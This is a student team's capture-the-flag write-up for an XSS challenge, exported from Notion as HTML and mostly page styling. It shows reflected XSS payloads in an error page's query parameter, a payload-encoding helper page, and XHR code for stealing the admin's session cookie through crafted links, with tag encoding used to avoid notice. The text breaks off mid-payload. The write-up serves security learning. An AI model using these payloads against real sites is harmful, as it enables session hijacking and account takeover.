@@ -1,0 +1,718 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>XSS</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	text-indent: -1.7em;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-opaquegray { background-color: rgba(255, 255, 255, 0.0375); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="5e2da78e-d724-44ae-a695-04b9df49fbc8" class="page sans"><header><h1 class="page-title">XSS</h1></header><div class="page-body"><p id="c20d27b4-d07a-4938-a0aa-8c1e01e9c585" class=""><a href="https://obxssession.hackthe.space/">https://obxssession.hackthe.space/</a></p><p id="6b16fc78-f48b-4270-90bd-b0c4ba2caaa6" class=""><a href="https://www.url-encode-decode.com/">https://www.url-encode-decode.com/</a></p><p id="a55d336f-6711-4617-8655-53da2d5d4858" class=""><a href="https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie">https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie</a></p><p id="0e4c3905-593b-4749-8879-ec1d8b18f6a7" class="">
+</p><p id="b3bfb9b7-61df-47f8-bdc1-1a0f2d6b7ad6" class="">PayloadEncoder:</p><figure id="e4007972-b839-49bb-83ca-2d6262591b96"><div class="source"><a href="XSS%205e2da78ed72444aea69504b9df49fbc8/tool.html">https://s3-us-west-2.amazonaws.com/secure.notion-static.com/bb81f52d-d8c5-4546-8b6f-8564cef60dbb/tool.html</a></div></figure><p id="4f8dc317-4da2-4d66-87c6-5edab325aa46" class="">
+</p><p id="97305b7c-24a2-4209-93da-33c0bda2db77" class="">Hint:</p><p id="20412702-2568-42ec-be47-6c34c088e490" class=""><mark class="highlight-gray">Please notice that the </mark>admin <mark class="highlight-gray">is very interested in new theories and </mark>they are periodically accessing their inbox clicking on links received by other members <mark class="highlight-gray">of the community</mark>. <mark class="highlight-red">→ Admin opens mails</mark></p><p id="046739fb-8348-4fd7-b115-eae4d3925011" class=""><mark class="highlight-gray">Since they&#x27;re paranoid, they&#x27;re wearing a tinfoil hat all the time and</mark> they configured their computer to never access any other website aside from obxssession!  <mark class="highlight-red">→ No CSRF</mark></p><p id="4b9076cd-6145-4abe-95f7-b2efa08bcbf5" class="">
+</p><p id="667932c2-f12c-4947-ad46-296a0f389551" class="">Interesting:<div class="indented"><p id="b83f5f5d-3c46-451b-995e-b327a48ecf72" class="">URL of page 5: <a href="https://obxssession.hackthe.space/error?m=theory%20is%20private&amp;p=/theory/5">https://obxssession.hackthe.space/error?m=theory is private&amp;p=/theory/5</a></p><p id="07be3fad-e41d-4274-b958-88287046c1bc" class="">Register page: <a href="https://obxssession.hackthe.space/register">https://obxssession.hackthe.space/register</a></p><p id="1c81847e-3ac7-45d0-8363-71ac31b6c6a1" class="">Login page: <a href="https://obxssession.hackthe.space/login">https://obxssession.hackthe.space/login</a></p><p id="fdbec1af-1469-4762-80e9-39c8ffdd353a" class="">Send Messages: <a href="https://obxssession.hackthe.space/send">https://obxssession.hackthe.space/send</a></p><p id="2ab3fdff-9b46-4e51-8be4-170fcd1043fe" class="">Recieve Messages: <a href="https://obxssession.hackthe.space/messages">https://obxssession.hackthe.space/messages</a></p><p id="cd4b0988-2776-4e20-9c91-a5c5e2eabb2d" class="">Personal Theories: <a href="https://obxssession.hackthe.space/profile">https://obxssession.hackthe.space/profile</a></p><p id="3de7abdf-b96b-4710-b05c-6b38126a7292" class="">
+</p></div></p><h1 id="88469b90-45ad-4a27-9401-0b59737b9ca3" class="">Obxsession Markdown- 11912007</h1><h2 id="c0cafa8f-41c5-420a-a34c-b353220e07d3" class="">Team</h2><p id="ccd7d367-0528-4be8-acbd-c45c0ee11a0a" class="">For this challenge I worked with:</p><ul id="f39cb896-afd5-411f-9328-1c49b17b70e6" class="bulleted-list"><li style="list-style-type:disc">Johannes Zottele - 11911133</li></ul><ul id="327e62c5-addf-41d6-a65e-7fd20efc5b9a" class="bulleted-list"><li style="list-style-type:disc">Johanna Wolfsberg - 11916452</li></ul><p id="524f7470-fca8-4a4f-bff9-c3c7d249a566" class="">
+</p><h2 id="1d6996bc-e86e-4a43-a89f-3f8cf5cf8773" class="">Overview </h2><p id="e23835f4-c1ff-40ee-ad81-a2bf77d0308b" class="">The website <a href="https://obxssession.hackthe.space/error?m=theory%20is%20private&amp;p=/theory/5">https://obxssession.hackthe.space/</a> serves as a conspiracy blog. A the page <a href="https://obxssession.hackthe.space/error?m=theory%20is%20private&amp;p=/theory/5">https://obxssession.hackthe.space/error?m=theory is private&amp;p=/theory/5</a> is inaccessible.</p><p id="57a52780-0e2c-4df9-8d1f-d6bb610563eb" class="">On this site one is able to register and send messages to other users aswell as the admin and look all of ones posts.</p><p id="50f61a8b-daee-4997-bf44-566771ea3270" class="">From the CTF Page we know the following things:</p><ul id="1bafe13d-0672-4979-beb4-98ae8ace7eed" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-gray">Please notice that the </mark>admin <mark class="highlight-gray">is very interested in new theories and </mark>they are periodically accessing their inbox clicking on links received by other members <mark class="highlight-gray">of the community</mark>. <mark class="highlight-red">→ Admin opens mails</mark></li></ul><ul id="a3038360-98ff-48d3-9533-568688d01582" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-gray">Since they&#x27;re paranoid, they&#x27;re wearing a tinfoil hat all the time and</mark> they configured their computer to never access any other website aside from obxssession!  <mark class="highlight-red">→ No CSRF</mark></li></ul><p id="f9afd84e-8563-41c7-b318-7910a219037b" class="">
+</p><p id="875216b5-8200-4f40-a713-8dd459eb4a1b" class="">Interesting pages:<div class="indented"><ul id="b9c142ba-84e8-4497-96cb-767ba5fa1e7d" class="bulleted-list"><li style="list-style-type:disc">URL of page 5: <a href="https://obxssession.hackthe.space/error?m=theory%20is%20private&amp;p=/theory/5">https://obxssession.hackthe.space/error?m=theory is private&amp;p=/theory/5</a></li></ul><ul id="25882193-20bb-49fe-95eb-60fd6bf5a3bc" class="bulleted-list"><li style="list-style-type:disc">Register page: <a href="https://obxssession.hackthe.space/register">https://obxssession.hackthe.space/register</a></li></ul><ul id="03d278e0-8838-45e4-b03a-f2cc62e8c333" class="bulleted-list"><li style="list-style-type:disc">Login page: <a href="https://obxssession.hackthe.space/login">https://obxssession.hackthe.space/login</a></li></ul><ul id="0720b30c-e7e1-44c4-89a8-855099b31d4e" class="bulleted-list"><li style="list-style-type:disc">Send Messages: <a href="https://obxssession.hackthe.space/send">https://obxssession.hackthe.space/send</a></li></ul><ul id="3a87ce9e-8484-4dfa-934f-41810a78671d" class="bulleted-list"><li style="list-style-type:disc">Recieve Messages: <a href="https://obxssession.hackthe.space/messages">https://obxssession.hackthe.space/messages</a></li></ul><ul id="a20417e8-51e9-4b13-874d-ca93e31776ea" class="bulleted-list"><li style="list-style-type:disc">Personal Theories: <a href="https://obxssession.hackthe.space/profile">https://obxssession.hackthe.space/profile</a></li></ul><p id="4be2b970-1a32-4409-b501-e42dafed2e14" class="">
+</p></div></p><h2 id="6fa841e0-b54c-4630-9efc-e24f42244c50" class="">Vulnerability</h2><p id="477d484d-8b1b-40a6-b72c-11893232e191" class="">Just by looking at the query parameters in the url of the page with the path <code>/theory/5</code> it is immediately clear that there might be a vulnerability for XSS.</p><p id="4970e2e1-e88b-45ab-8ce9-16666f981338" class="">So we verify our hypothesis like so:</p><pre id="58546d81-b4c7-411f-8eac-779aeb88df71" class="code"><code>https://obxssession.hackthe.space/error?m=theory is private&amp;p=&lt;script&gt;alert(&#x27;whoopty!&#x27;);&lt;/script&gt; </code></pre><p id="947bd16f-d5aa-4333-aeb6-57642fad8db5" class="">
+</p><h2 id="0c3f1480-49ab-4dc2-a72a-7a892407908c" class="">Preparation</h2><p id="6412f4be-6233-4657-aeb0-1467f52a3473" class="">We wrote a simple script to make writing payloads that get injected as URL queries easier.</p><pre id="59e5e022-672e-4e37-a61d-5020099373e2" class="code"><code>&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Document&lt;/title&gt;
+&lt;/head&gt;
+
+&lt;style&gt;
+    body {
+        width: 100%;
+    }
+&lt;/style&gt;
+
+&lt;body&gt;
+    &lt;textarea type=&quot;text&quot; id=&quot;input&quot;&gt;&lt;/textarea&gt;
+    &lt;p id=&quot;output&quot; style=&quot;width: 500px;&quot;&gt;&lt;/p&gt;
+    &lt;script&gt;
+        const url = &#x27;https://obxssession.hackthe.space/error?m=theoryprivate&amp;p=&#x27;;
+        const out = document.getElementById(&quot;output&quot;);
+
+        const input = document.getElementById(&quot;input&quot;).addEventListener(&#x27;change&#x27;, function() {
+            out.innerText = url + &quot;&lt;script\&gt;&quot; + this.value.replace(/ /g, &quot;%20&quot;).replace(/\n/g,&quot;&quot;).replace(/&amp;/g, &quot;%26&quot;).replace(/=/g, &quot;%3D&quot;) + &#x27;\&lt;/script\&gt;&#x27;;
+        })
+        
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre><p id="e33245e1-200a-4c26-8282-d9b8ac1c7eb8" class="">
+</p><h2 id="109da0bb-8a73-49f4-917a-6d52031a0667" class="">Exploitation</h2><p id="1b4d3020-17dc-4011-9ca8-89462292652a" class="">First we registered ourselves.</p><h3 id="ff0d962b-4b6b-4258-a40b-68411106e8cd" class="">Step 1</h3><p id="43d4e5a9-188a-44e7-88b4-60a39bb30bea" class="">We first observe the sent and recieved request bodies sent by our browser through the chrome developer tools to then use them in postman.exe.</p><p id="ebd9479a-4bdb-4e65-baa8-a6238d05ec83" class="">Logging in:</p><ol type="1" id="fb6562ba-116c-404a-a2b9-c420bc1bb0a4" class="numbered-list" start="1"><li><code>mail</code></li></ol><ol type="1" id="e0969c51-37c8-4b7e-b19a-aedc94a33420" class="numbered-list" start="2"><li><code>password</code></li></ol><p id="44363cd4-8755-4c1b-a8f7-16742b081881" class="">
+</p><p id="e2b2e409-28bc-4029-bc46-cad90750cbdd" class="">Sending messages:</p><ol type="1" id="138f59c4-52c0-4748-8df7-6c445f58aace" class="numbered-list" start="1"><li><code>receiver</code> (every user has a specific Id that can be seen in the HTML file. Mine was 141)</li></ol><ol type="1" id="ca721ad0-5185-4e07-a4b2-9a634ae6139f" class="numbered-list" start="2"><li><code>subject</code></li></ol><ol type="1" id="ac6d010b-48e7-42b8-b826-3bf204792729" class="numbered-list" start="3"><li><code>contents</code></li></ol><p id="a0cb7fd6-4b2e-4875-9b9e-7cf33e9816fc" class="">
+</p><p id="5e485833-ae61-4c90-859c-58a24b38dcce" class="">Payload:</p><pre id="cb56e9a5-d11b-4b1c-882e-8741dcc16cc0" class="code"><code>var xhr = new XMLHttpRequest();
+xhr.open(&quot;POST&quot;, &quot;https://obxssession.hackthe.space/send&quot;, true);
+xhr.setRequestHeader(&#x27;Content-Type&#x27;, &#x27;application/x-www-form-urlencoded&#x27;);
+xhr.send(&quot;receiver=141&amp;subject=AAAAAAABBBBBBAAAAAAAA&amp;contents=AAAAAAAAAAAAAAAAAAAAA&quot;);</code></pre><p id="f099c4fc-538c-4ff8-84fc-41ef1e775209" class="">Encoded:</p><pre id="e0f3ce68-404d-4957-9035-d77f91118279" class="code"><code>https://obxssession.hackthe.space/error?m=theoryprivate&amp;p=&lt;script&gt;var%20xhr%20%3D%20new%20XMLHttpRequest();xhr.open(&quot;POST&quot;,%20&quot;https://obxssession.hackthe.space/send&quot;,%20true);xhr.setRequestHeader(&#x27;Content-Type&#x27;,%20&#x27;application/x-www-form-urlencoded&#x27;);xhr.send(&quot;receiver%3D141%26subject%3DAAAAAAABBBBBBAAAAAAAA%26contents%3DAAAAAAAAAAAAAAAAAAAAA&quot;);&lt;/script&gt;</code></pre><p id="faf4919d-dcdb-4a99-8fc9-e847eef8655a" class="">
+</p><h3 id="0535009c-1388-4268-85c1-49f79b5f80c9" class="">Step 2</h3><p id="e648d527-20b0-4288-ba4b-ed5d498d82df" class="">Now we must send a link with a payload placed in the URL to the admin so that he sends us his session cookie that authorizes him to access certain any page on this website.</p><p id="ff95689e-cc0a-47df-9418-fa027cf87f6a" class="">Then we sent this link to the admin but figured out that we must hide script tags by encoding them through the URL encoding <code>&lt;%73%63%72%69%70%74&gt;</code>  or else the admin finds out that we are trying to hack him.</p><p id="02ff5893-c5f5-46e8-bfc5-41a4fd30f447" class="">We did this for any payload from this point onwards.</p><pre id="075d2459-9684-46bf-9974-5bce681e04c9" class="code"><code>var xhr = new XMLHttpRequest();
+xhr.open(&quot;POST&quot;, &quot;https://obxssession.hackthe.space/send&quot;, true);
+xhr.setRequestHeader(&#x27;Content-Type&#x27;, &#x27;application/x-www-form-urlencoded&#x27;);
